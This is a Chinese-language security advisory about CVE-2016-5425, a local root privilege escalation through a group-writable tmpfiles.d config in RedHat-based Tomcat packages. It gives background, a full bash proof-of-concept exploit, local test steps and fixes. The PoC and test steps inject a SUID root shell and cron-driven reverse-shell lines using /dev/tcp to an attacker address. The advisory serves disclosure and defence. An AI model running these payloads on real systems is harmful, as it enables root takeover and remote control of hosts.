> 原文链接: https://www.anquanke.com//post/id/84700 


# 【漏洞预警】Apache Tomcat 8/7/6 (基于RedHat发行版的)本地提权漏洞


                                阅读量   
                                **194736**
                            
                        |
                        
                                                                                    



[![](https://p0.ssl.qhimg.com/t010f450d4a5fc8387e.jpg)](https://p0.ssl.qhimg.com/t010f450d4a5fc8387e.jpg)

I. 漏洞描述

Apache Tomcat （基于RedHat发行版）的本地提权漏洞



**II. 背景介绍**

Tomcat是由Apache软件基金会下属的Jakarta项目开发的一个Servlet容器，按照Sun Microsystems提供的技术规范，实现了对Servlet和JavaServer Page（JSP）的支持，并提供了作为Web服务器的一些特有功能，如Tomcat管理和控制平台、安全域管理和Tomcat阀等。

官方网站：http://tomcat.apache.org/



**III.介绍**

Apache Tomcat （基于RedHat发行版）的安装包（包括CentOS, RedHat, OracleLinux, Fedora,等等）安装后由于文件权限配置不当，会新建一个允许tomcat用户权限读写tmpfiles.d的配置文件（例如，攻击者可以利用WEB漏洞来读写此文件），从而允许攻击者从tomcat用户权限提升到root权限，实现完全控制系统。



**IV.漏洞描述**

基于RedHat发行版的Tomcat安装后，tomcat组用户对tomcat.conf文件具有写权限，如下



```
[root@localhost ~]# ls -al /usr/lib/tmpfiles.d/tomcat.conf 
-rw-rw-r--. 1 root tomcat 43 May 12  2015 /usr/lib/tmpfiles.d/tomcat.conf
```



tmpfiles.d目录下的配置文件是systemd-tmpfiles用于管理临时文件的，攻击者可以非常容易的注入恶意payload进tomcat.conf文件，比如新建一个反弹SHELL，新建一个具有SUID权限的文件。当/usr/bin/systemd-tmpfiles执行的时候，注入的payload也会随之得到执行。



在REDHAT发行版，默认启动后，systemd-tmpfiles会通过systemd-tmpfiles-setup.service服务得到执行，如下：



```
[root@localhost www]# cat /usr/lib/systemd/system/systemd-tmpfiles-setup.service |grep ExecStart
ExecStart=/usr/bin/systemd-tmpfiles --create --remove --boot --exclude-prefix=/dev
```

依赖于系统使用，systemd-tmpfiles也可以通过其他服务，cronjobs,启动脚本，等方式来触发。值得说明的另外一个地方是， systemd-tmpfiles不会因为配置文件中的语法错误导致报错停止。因此攻击者可以很容易的注入恶意PAYLOAD到/usr/lib/tmpfiles.d/tomcat.conf 



根据下面的POC，我们可以看到

```
C /usr/share/tomcat/rootsh 4770 root root - /bin/bash
z /usr/share/tomcat/rootsh 4770 root root -
F /etc/cron.d/tomcatexploit 0644 root root - "* * * * * root nohup bash -i &gt;/dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0&lt;&amp;1 2&gt;&amp;1
```



被注入到tomcat.conf ，意思是反弹SHELL，并新建一个具有SUID权限的shell,具体C，z,F的含义，我们可以通过 man 5 tmpfiles.d来查看。



**V. POC和本地测试**



```
-----------[ tomcat-RH-root.sh ]---------
 
#!/bin/bash
# Apache Tomcat packaging on RedHat-based distros - Root Privilege Escalation PoC Exploit
# CVE-2016-5425
#
# Full advisory at:
# http://legalhackers.com/advisories/Tomcat-RedHat-Pkgs-Root-PrivEsc-Exploit-CVE-2016-5425.html
#
# Discovered and coded by:
# Dawid Golunski
# http://legalhackers.com
#
# Tested on RedHat, CentOS, OracleLinux, Fedora systems.
#
# For testing purposes only.
#
 
ATTACKER_IP=127.0.0.1
ATTACKER_PORT=9090
 
echo -e "n* Apache Tomcat (RedHat distros) - Root PrivEsc PoC CVE-2016-5425 *"
echo -e  "  Discovered by Dawid Golunskin"
echo "[+] Checking vulnerability"
ls -l /usr/lib/tmpfiles.d/tomcat.conf | grep 'tomcat'
if [ $? -ne 0 ]; then
    echo "Not vulnerable or tomcat installed under a different user than 'tomcat'"
    exit 1
fi
echo -e "n[+] Your system is vulnerable!"
 
echo -e "n[+] Appending data to /usr/lib/tmpfiles.d/tomcat.conf..."
cat&lt;&lt;_eof_&gt;&gt;/usr/lib/tmpfiles.d/tomcat.conf
C /usr/share/tomcat/rootsh 4770 root root - /bin/bash
z /usr/share/tomcat/rootsh 4770 root root -
F /etc/cron.d/tomcatexploit 0644 root root - "* * * * * root nohup bash -i &gt;/dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0&lt;&amp;1 2&gt;&amp;1 &amp; nn"
_eof_
 
echo "[+] /usr/lib/tmpfiles.d/tomcat.conf contains:"
cat /usr/lib/tmpfiles.d/tomcat.conf
echo -e "n[+] Payload injected! Wait for your root shell...n"
echo -e "Once '/usr/bin/systemd-tmpfiles --create' gets executed (on reboot by tmpfiles-setup.service, by cron, by another service etc.), 
the rootshell will be created in /usr/share/tomcat/rootsh. 
Additionally, a reverse shell should get executed by crond shortly after and connect to $ATTACKER_IP:$ATTACKER_PORT n"
 --------------[ eof ]--------------------
```



本地测试：

1.先确定下本地LINUX发行版本和TOMCAT版本

[![](https://p0.ssl.qhimg.com/t012d9b0c03193eb71f.png)](https://p0.ssl.qhimg.com/t012d9b0c03193eb71f.png)

2.切换到tomcat组权限下，附加恶意payload到/usr/lib/tmpfiles.d/tomcat.conf文件中

[![](https://p1.ssl.qhimg.com/t01e3afadf07ca9bc59.png)](https://p1.ssl.qhimg.com/t01e3afadf07ca9bc59.png)

```
cat&lt;&lt;_eof_&gt;&gt;/usr/lib/tmpfiles.d/tomcat.conf
F /etc/cron.d/tomcatexploit 0644 root root - "* * * * * root nohup bash -i &gt;/dev/tcp/192.168.1.3/9999 0&lt;&amp;1 2&gt;&amp;1 &amp; nn"
_eof_
```

3.root权限下手动触发/usr/bin/systemd-tmpfiles –create         [这步比较鸡肋，依赖系统有其他服务，cronjobs,启动脚本来触发，如果系统有，则好，如果没有，这个漏洞相对利用来说，需要触发systemd-tmpfiles，有点鸡肋]

```
[root@localhost Desktop]# /usr/bin/systemd-tmpfiles --create
```

4.获取反弹ROOT权限的SHELL



**VI.漏洞影响**

攻击者可以在具有tomcat权限时，通过改写配置文件实现本地提权到ROOT权限。如果远程攻击者结合特定的WEB应用程序漏洞，也可以实现远程利用。



**VII. 影响的版本**

– CentOS

– Fedora

– Oracle Linux

– RedHat

Redhat官网细节:https://access.redhat.com/security/cve/CVE-2016-5425



**VIII.解决办法**

1.临时修复建议

可以调整/usr/lib/tmpfiles.d/tomcat.conf权限，移除tomcat组的写权限



```
chmod 644  /usr/lib/tmpfiles.d/tomcat.conf
```

2. 更新最新Tomcat包

Redhat安全小组已经在第一时间修复了受影响的Tomcat上游包,直接更新发行版提供的Tomcat即可。



**IX.参考**

 [http://legalhackers.com/advisories/Tomcat-RedHat-Pkgs-Root-PrivEsc-Exploit-CVE-2016-5425.html](http://legalhackers.com/advisories/Tomcat-RedHat-Pkgs-Root-PrivEsc-Exploit-CVE-2016-5425.html)

 

The source code of the exploit (tomcat-RH-root.sh) can be downloaded from:

[http://legalhackers.com/exploits/tomcat-RH-root.sh](http://legalhackers.com/exploits/tomcat-RH-root.sh)

 

CVE-2016-5425

[http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5425](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5425)

 

[https://access.redhat.com/security/cve/CVE-2016-5425](https://access.redhat.com/security/cve/CVE-2016-5425)
